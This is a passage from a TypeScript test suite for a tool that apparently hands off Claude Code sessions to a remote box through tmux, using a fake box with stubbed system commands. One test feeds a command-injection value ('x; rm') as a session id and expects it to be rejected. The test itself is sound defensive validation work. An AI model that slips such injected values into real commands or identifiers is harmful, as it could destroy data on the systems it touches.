    return scripts.get(key)!;
  }

  /** A fake box: /root/, /dev/shm and every project path mapped into a temp dir; a stateful fake tmux
   *  (sessions file; every call logged; an Enter makes the target's claude exit); flock via perl; the
   *  installers, tar, git clone, claude, bun, curl and sleep stubbed. */
  function fakeBox(sessions: string[] = []) {
    const d = mkdtempSync(join(tmpdir(), "nomo-box-")), bin = join(d, "bin");
    mkdirSync(bin); mkdirSync(join(d, "shm"));
    writeFileSync(join(d, "sessions"), sessions.map((x) => x + "\n").join(""));
    const exe = (name: string, body: string) => { writeFileSync(join(bin, name), `#!/bin/bash\n${body}\n`); chmodSync(join(bin, name), 0o755); };
    exe("tmux", `S=${d}/sessions
echo "$*" >> ${d}/calls
t=; n=; prev=; for a in "$@"; do [ "$prev" = -t ] && t=$a; [ "$prev" = -s ] && n=$a; prev=$a; done
t=\${t#=}; t=\${t%:}
case "$1" in
  has-session) grep -qxF -- "$t" $S ;;
  kill-session) grep -vxF -- "$t" $S > $S.n; mv $S.n $S ;;
  ls) [ -s $S ] && cat $S || exit 1 ;;
  new-session) grep -qxF -- "$n" $S && exit 1; echo "$n" >> $S ;;
  send-keys) [ "\${@: -1}" = Enter ] && { grep -vxF -- "$t" $S > $S.n; mv $S.n $S; } ; true ;;
  capture-pane) echo "screen of $t" ;;
  kill-server) : > $S ;;
esac`);
    exe("flock", `fd=\${@: -1}; op=LOCK_EX; [ "$1" = -u ] && op=LOCK_UN
exec perl -MFcntl=:flock -e 'open(my $f, ">&=", $ARGV[0]) or die "fd"; flock($f, $ARGV[1] eq "LOCK_UN" ? LOCK_UN : LOCK_EX) or die "lock"' "$fd" "$op"`);
    exe("claude", `[ "$1" = --version ] && echo "9.9.9 (Claude Code)"; exit 0`);
    exe("git", `case "$*" in *" clone "*) mkdir -p "\${@: -1}" ;; esac; exit 0`);
    for (const x of ["tar", "bun", "curl", "sleep", "apt-get"]) exe(x, "exit 0");
    const map = (script: string) => {
      for (const p of projects.values()) script = script.replaceAll(p, `${d}/box${p}`);
      return script.replaceAll("/root/", `${d}/root/`).replaceAll("/dev/shm", `${d}/shm`);
    };
    const env = (e: Record<string, string>) => ({ PATH: `${bin}:/usr/bin:/bin`, ANTHROPIC_AUTH_TOKEN: "test-token", ...e });
    const run = (script: string, e: Record<string, string> = {}) => {
      try { return { stdout: execFileSync("bash", ["-c", map(script)], { env: env(e) }).toString(), code: 0 }; }
      catch (err) { const x = err as { stdout: Buffer; status: number }; return { stdout: x.stdout.toString(), code: x.status }; }
    };
    const runAsync = (script: string, e: Record<string, string> = {}) => new Promise<{ stdout: string; code: number }>((res) => {
      const c = spawn("bash", ["-c", map(script)], { env: env(e) });
      let out = "";
      c.stdout.on("data", (b) => (out += b));
      c.on("exit", (code) => res({ stdout: out, code: code ?? 1 }));
    });
    const handOff = (u: string, name: string, e: Record<string, string> = {}) => run(realScript(u, name), e);
    const tmux = () => readFileSync(join(d, "sessions"), "utf8").split("\n").filter(Boolean);
    const calls = () => (existsSync(join(d, "calls")) ? readFileSync(join(d, "calls"), "utf8") : "");
    const marker = (u: string) => readFileSync(join(d, "root/.nomo-sessions", u), "utf8");
    return { d, run, runAsync, handOff, tmux, calls, marker, boxRoot: (name: string) => `${d}/box${proj(name)}` };
  }

  test("two handoffs from different projects coexist, each in its own tmux, marker and key file", () => {
    const b = fakeBox(["nomo-relay", "nomo-keepalive"]);
    const r = b.handOff(A, "one");
    expect(r.stdout).not.toMatch(/NOMO_(BUSY|SAME_ROOT|FULL|LOCKED|KEYS_GONE)/);
    expect(r.code).toBe(0);
    expect(b.handOff(B, "two").code).toBe(0);
    expect(b.tmux().sort()).toEqual(["nomo-aaaaaaaa1111", "nomo-bbbbbbbb1111", "nomo-keepalive", "nomo-relay"]);
    expect(b.marker(A)).toBe(`${b.boxRoot("one")}\nnomo-aaaaaaaa1111\n`);
    expect(readdirSync(join(b.d, "root/.nomo-sessions")).sort()).toEqual([A, B]); // no claims left behind
    expect(b.calls()).not.toContain("kill-server");
    expect(b.calls().split("kill-session -t =nomo-relay").length - 1).toBe(1); // A's fresh start only: B never restarted it
    expect(b.run(statusScript()).stdout).toMatch(new RegExp(`^Sessions on the box:\\n  ${A}  running +${b.boxRoot("one")}[\\s\\S]*${B}  running +${b.boxRoot("two")}[\\s\\S]*2 of 4 running\\nNOMO_STATUS_SPLIT`));
  });

  test("the same project twice is refused, even with --force (they would share the working tree)", () => {
    const b = fakeBox();
    b.handOff(A, "one");
    for (const env of [{}, { NOMO_FORCE: "1" }] as Record<string, string>[]) {
      const r = b.handOff(B, "one", env);
      expect(r.code).toBe(3);
      expect(r.stdout).toContain(`NOMO_SAME_ROOT=${A}`);
      expect(busyMessage(r.stdout, "box1", B, "/p/one")).toContain(`--back --session ${A}`);
    }
    expect(existsSync(join(b.d, "root/.nomo-sessions", B))).toBe(false); // a refusal claims nothing
    // a STOPPED session still holds its root (its work waits for --back); brought back, the root is free
    b.run(backStopScript(A));
    expect(b.handOff(B, "one").code).toBe(3);
    b.run(`${boxPrelude(A)}\nrm -f "$SD/"'${A}'`); // what --back does once the work is home
    expect(b.handOff(B, "one").code).toBe(0);
  });

  test(`a ${BOX_MAX_SESSIONS + 1}th session is refused with the cap message; a stopped one frees a slot`, () => {
    const b = fakeBox();
    for (const [u, r] of [[A, "a"], [B, "b"], [C, "c"], [D, "d"]]) expect(b.handOff(u, r).code).toBe(0);
    const r = b.handOff(E, "e");
    expect(r.code).toBe(3);
    expect(r.stdout).toContain("NOMO_FULL=4");
    expect(busyMessage(r.stdout, "box1", E, "/e")).toContain("the cap is 4");
    b.run(backStopScript(D));
    expect(b.handOff(E, "e").code).toBe(0);
  });

  test("concurrent handoffs are serialized at admission: same root → exactly one wins; the cap holds", async () => {
    const b = fakeBox();
    const same = await Promise.all([b.runAsync(realScript(A, "race")), b.runAsync(realScript(B, "race"))]);
    expect(same.map((x) => x.code).sort()).toEqual([0, 3]);
    expect(same.find((x) => x.code === 3)!.stdout).toMatch(/NOMO_SAME_ROOT=/);
    b.handOff(C, "c"); b.handOff(D, "d");
    const cap = await Promise.all([b.runAsync(realScript(E, "e")), b.runAsync(realScript(L, "l"))]);
    expect(cap.map((x) => x.code).sort()).toEqual([0, 3]);
    expect(cap.find((x) => x.code === 3)!.stdout).toContain("NOMO_FULL=4");
    expect(b.tmux().filter((t) => /^nomo-[0-9a-f]{12}$/.test(t)).length).toBe(4);
  });

  test("a handoff that fails after admission releases its claim (no phantom marker holds the root)", () => {
    const b = fakeBox();
    const broken = realScript(A, "one").replace("tmux new-session -d -s \"$T\"", "false && tmux new-session -d -s \"$T\"");
    expect(b.run(broken).code).not.toBe(0);
    expect(readdirSync(join(b.d, "root/.nomo-sessions"))).toEqual([]);
    expect(b.handOff(B, "one").code).toBe(0);
  });

  test("--force replaces only its own session's tmux, never the server", () => {
    const b = fakeBox(["nomo-relay"]);
    b.handOff(A, "a"); b.handOff(B, "b");
    const busy = b.handOff(A, "a");
    expect(busy.code).toBe(3);
    expect(busy.stdout).toContain("NOMO_BUSY");
    expect(busyMessage(busy.stdout, "box1", A, "/a")).toContain("--force");
    expect(b.handOff(A, "a", { NOMO_FORCE: "1" }).code).toBe(0);
    expect(b.calls()).toContain("kill-session -t =nomo-aaaaaaaa1111");
    expect(b.calls()).not.toContain("kill-server");
    expect(b.calls()).not.toContain("kill-session -t =nomo-bbbbbbbb1111");
    expect(b.tmux().sort()).toEqual(["nomo-aaaaaaaa1111", "nomo-bbbbbbbb1111", "nomo-keepalive", "nomo-relay"]);
  });

  test("with sessions running the plugin is never reinstalled under them (one line says which version stays)", () => {
    const b = fakeBox();
    b.handOff(A, "a");
    mkdirSync(join(b.d, "root/.claude/plugins/cache/nomo/nomo-cc/0.0.1"), { recursive: true });
    const r = b.handOff(B, "b");
    expect(r.code).toBe(0);
    expect(r.stdout).toContain("keeps Nomo plugin 0.0.1");
    expect(existsSync(join(b.d, "root/.claude/plugins/cache/nomo/nomo-cc/0.0.1"))).toBe(true);
  });

  test("the launch never starts claude without its key file", () => {
    const d = mkdtempSync(join(tmpdir(), "nomo-launch-")), bin = join(d, "bin");
    mkdirSync(bin);
    writeFileSync(join(bin, "claude"), `#!/bin/sh\necho CLAUDE_RAN\n`); writeFileSync(join(bin, "sleep"), "#!/bin/sh\nexit 0\n");
    chmodSync(join(bin, "claude"), 0o755); chmodSync(join(bin, "sleep"), 0o755);
    let out = "";
    try { out = execFileSync("bash", ["-c", launchLine(A, "m").replaceAll("/dev/shm", d)], { env: { PATH: `${bin}:/usr/bin:/bin` } }).toString(); }
    catch (e) { out = (e as { stdout: Buffer }).stdout.toString(); }
    expect(out).toContain("key file is gone");
    expect(out).not.toContain("CLAUDE_RAN");
    expect(SHM_SWEEP).toContain("-mmin +15");
    expect(realScript(A, "one")).toMatch(/\[ -f \/dev\/shm\/nomo-env-aaaaaaaa1111 \] \|\| \{ echo "NOMO_KEYS_GONE"; exit 5; \}\ntouch \/dev\/shm\/nomo-env-aaaaaaaa1111\ntmux new-session/);
  });

  test("stopping one leaves the other running and the box awake; stopping the last hibernates", async () => {
    const b = fakeBox(["nomo-relay", "nomo-keepalive"]);
    b.handOff(A, "a"); b.handOff(B, "b");
    let slept = 0;
    const run = async (s: string, env: Record<string, string>) => b.run(s, env);
    const hibernate = async () => { slept++; };
    expect(await stopOne(A, run, hibernate)).toMatch(/Stopped session .*stays awake for 1 running/);
    expect(slept).toBe(0);
    expect(b.tmux().sort()).toEqual(["nomo-bbbbbbbb1111", "nomo-keepalive", "nomo-relay"]);
    expect(existsSync(join(b.d, "root/.nomo-sessions", A))).toBe(true); // its work waits for --back
    expect(await stopOne(B, run, hibernate)).toMatch(/No session left running, so the box is asleep/);
    expect(slept).toBe(1);
    expect(await stopOne(E, run, hibernate)).toMatch(/no session/); // never handed off here
    expect(slept).toBe(1);
  });

  test("the keep-awake loop runs while ANY session's tmux does (never for relay/keepalive/pair alone)", () => {
    const has = (s: string[]) => fakeBox(s).run(`${ANY_SESSION} && echo yes || echo no`).stdout.trim();
    expect(has([])).toBe("no");
    expect(has(["nomo-relay", "nomo-keepalive", "nomo-pair"])).toBe("no");
    expect(has(["nomo-relay", "nomo-bbbbbbbb1111"])).toBe("yes");
    expect(has(["nomo-relay", "nomo-bbbbbbbb"])).toBe("yes"); // started by 2.3.29
    expect(has(["nomo"])).toBe("yes"); // a pre-2.3.29 session
    expect(keepaliveLoop()).toContain(`while ${ANY_SESSION}; do`);
  });

  test("box names use a 12-char id; per-session key file, upload stage and pack", () => {
    expect(id12(A)).toBe("aaaaaaaa1111");
    expect(tmuxName(A)).toBe("nomo-aaaaaaaa1111");
    expect(shmEnvFile(A)).toBe("/dev/shm/nomo-env-aaaaaaaa1111");
    expect(launchLine(A, "m")).toContain(`. /dev/shm/nomo-env-aaaaaaaa1111; rm -f /dev/shm/nomo-env-aaaaaaaa1111;`);
    expect(realScript(A, "one")).toContain("/tmp/nomo-handoff-aaaaaaaa1111-project.tgz");
    expect(backPrefix(A)).toBe("/tmp/nomo-back-aaaaaaaa1111");
    expect(backPackScript(A, "-a", "/a", true)).toContain(`rm -f ${backPrefix(A)}-*`);
  });

  test("a session started by 2.3.29 (marker naming nomo-<id8>) is still found", () => {
    const b = fakeBox(["nomo-aaaaaaaa"]);
    mkdirSync(join(b.d, "root/.nomo-sessions"), { recursive: true });
    writeFileSync(join(b.d, "root/.nomo-sessions", A), "/p/x\nnomo-aaaaaaaa\n");
    expect(b.run(paneScript("screen", A)).stdout).toContain("screen of nomo-aaaaaaaa");
    expect(b.run(backStopScript(A)).stdout).toContain("NOMO_LEFT=0");
  });

  function legacyBox(sessions: string[]) {
    const b = fakeBox(sessions);
    mkdirSync(join(b.d, "root/.claude/projects/-p-legacy"), { recursive: true });
    writeFileSync(join(b.d, "root/.nomo-current"), L);
    writeFileSync(join(b.d, "root/.claude/projects/-p-legacy", `${L}.jsonl`), JSON.stringify({ type: "user", cwd: "/p/legacy" }) + "\n");
    return b;
  }

  test("a pre-2.3.29 box (tmux `nomo`, /root/.nomo-current) is migrated: --screen, --back and the root check find it", () => {
    const b = legacyBox(["nomo-relay", "nomo"]);
    const screen = b.run(paneScript("screen", L));
    expect(screen.code).toBe(0);
    expect(screen.stdout).toContain("screen of nomo");
    expect(b.calls()).toContain("capture-pane -p -t =nomo:");
    expect(existsSync(join(b.d, "root/.nomo-current"))).toBe(false);
    expect(b.marker(L)).toBe("/p/legacy\nnomo\n");
    expect(b.run(backWaitScript(L, "-p-legacy")).stdout).not.toMatch(/NOMO_OTHER|NOMO_GONE/);
    expect(b.run(statusScript()).stdout).toContain(`${L}  running  /p/legacy`);
    expect(b.run(backStopScript(L)).stdout).toContain("NOMO_LEFT=0");
    expect(b.tmux()).toEqual(["nomo-relay"]);
  });

  test("a stale /root/.nomo-current (old --back never removed it; no `nomo` tmux) is dropped, not migrated", () => {
    const b = legacyBox(["nomo-relay"]);
    expect(b.run(statusScript()).stdout).toContain("0 of 4 running");
    expect(existsSync(join(b.d, "root/.nomo-current"))).toBe(false);
    expect(existsSync(join(b.d, "root/.nomo-sessions", L))).toBe(false);
    expect(b.run(backWaitScript(L, "-p-legacy")).stdout).toContain("NOMO_OTHER");
  });

  test("a stale box marker (not running, not on the Mac's record) is dropped instead of blocking its folder", () => {
    const b = fakeBox();
    mkdirSync(join(b.d, "root/.nomo-sessions"), { recursive: true });
    writeFileSync(join(b.d, "root/.nomo-sessions", L), `${b.boxRoot("ghost")}\nnomo\n`);
    expect(b.handOff(A, "ghost").stdout).toContain(`NOMO_SAME_ROOT=${L}`);                // no record given: kept
    expect(b.handOff(A, "ghost", { NOMO_KNOWN: L }).stdout).toContain(`NOMO_SAME_ROOT=${L}`); // still on the Mac's record
    expect(b.run(statusScript(), { NOMO_KNOWN: B }).stdout).toContain(`Dropped the box's stale record of session ${L}`);
    writeFileSync(join(b.d, "root/.nomo-sessions", L), `${b.boxRoot("ghost")}\nnomo\n`);
    const r = b.handOff(A, "ghost", { NOMO_KNOWN: "" });
    expect(r.code).toBe(0);
    expect(r.stdout).toContain(`Dropped the box's stale record of session ${L}`);
    // a running session or one mid-handoff is never pruned
    writeFileSync(join(b.d, "root/.nomo-sessions", C), "/c\nnomo-c\n");
    writeFileSync(join(b.d, "root/.nomo-sessions", ".claim-" + C), "");
    expect(b.run(statusScript(), { NOMO_KNOWN: "" }).stdout).not.toContain("Dropped");
    expect(existsSync(join(b.d, "root/.nomo-sessions", A))).toBe(true);
  });

  test("cloud.json writes are locked read-modify-writes: two concurrent writers both persist", async () => {
    const dir = mkdtempSync(join(tmpdir(), "nomo-cloud-")), path = join(dir, "cloud.json");
    const writer = (tag: string) => new Promise<number>((res) => {
      const code = `import { updateCloudAt } from ${JSON.stringify(join(import.meta.dir, "handoff.ts"))};
for (let i = 0; i < 25; i++) {
  const id = "${tag}" + String(i).padStart(4, "0") + "-1111-4222-8333-444455556666";
  updateCloudAt(${JSON.stringify(path)}, (c) => ({ ...c, active: [...(c.active ?? []), id], sessions: { ...c.sessions, [id]: { root: "/" + id } } }));
}`;
      spawn(process.execPath, ["-e", code], { stdio: "ignore" }).on("exit", (c) => res(c ?? 1));
    });
    expect(await Promise.all([writer("aaaa"), writer("bbbb")])).toEqual([0, 0]);
    const c = JSON.parse(readFileSync(path, "utf8"));
    expect(c.active.length).toBe(50);
    expect(Object.keys(c.sessions).length).toBe(50);
    expect(existsSync(`${path}.lock`)).toBe(false);
    expect(updateCloudAt(path, (x) => x).active?.length).toBe(50);
  });

  test("cloud.json: a legacy `current` migrates to `active`; garbage ids are dropped", () => {
    const snap = { [A]: { root: "/a" } } as never;
    expect(normalizeCloud({ sandboxId: "s", current: A, sessions: snap } as never)).toEqual({ sandboxId: "s", active: [A], sessions: snap });
    expect(normalizeCloud({ current: A, active: [B, "x; rm"] } as never)).toEqual({ active: [B] });
    expect(normalizeCloud({})).toEqual({ active: [] });
  });

  test("which session: --session, else the parked window's own, else the only active one, else a list", () => {
    const c = { active: [A, B], sessions: { [A]: { root: "/p/one" }, [B]: { root: "/p/two" } } } as never;
    expect(pickSession(C, undefined, c)).toBe(C);
    expect(() => pickSession("nope", undefined, c)).toThrow(/UUID/);
    expect(pickSession(true, B, c)).toBe(B);
    expect(pickSession(undefined, undefined, { active: [A] })).toBe(A);
    expect(() => pickSession(undefined, undefined, { active: [] })).toThrow(/no handed-off session/);
    expect(() => pickSession(undefined, undefined, c)).toThrow(new RegExp(`2 sessions .*--session[\\s\\S]*${A}  /p/one[\\s\\S]*${B}  /p/two`));
    const park = (id: string) => (id === C ? { state: "cloud" } : undefined);
    expect(hereSession(B, c, park)).toBe(B);          // active
    expect(hereSession(C, c, park)).toBe(C);          // a parked window (cloud.json no longer names it)
    expect(hereSession(D, c, park)).toBeUndefined();  // some other Claude Code session
    expect(hereSession(undefined, c, park)).toBeUndefined();
  });

  test("every new box script is valid bash", () => {
    for (const s of [statusScript(), `${boxPrelude(A)}\n${admitScript(A, "/it's")}`, paneScript("send", A), paneScript("key", A), realScript(A, "one")]) {
      execFileSync("bash", ["-n", "-c", s]);
    }
  });
});
